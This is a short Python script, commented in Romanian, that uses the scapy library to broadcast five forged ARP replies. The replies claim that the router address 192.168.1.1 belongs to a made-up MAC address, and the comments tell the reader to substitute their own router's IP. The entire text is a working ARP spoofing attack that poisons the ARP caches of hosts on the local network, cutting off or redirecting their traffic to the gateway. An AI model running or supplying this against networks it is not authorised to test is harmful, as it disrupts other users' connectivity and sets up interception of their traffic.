from scapy.all import send, ARP

# Înlocuiește "192.168.1.1" cu IP-ul routerului tău (dacă e diferit)
target_ip = "192.168.1.1" 
fake_mac = "aa:bb:cc:11:22:44" # Un MAC inventat

print("Trimit pachet ARP fals...")
# Trimitem un pachet care spune: "Eu sunt 192.168.1.1 și am MAC-ul aa:bb:cc..."
send(ARP(op=2, psrc=target_ip, hwsrc=fake_mac, pdst="192.168.1.255"), count=5)
print("Gata.")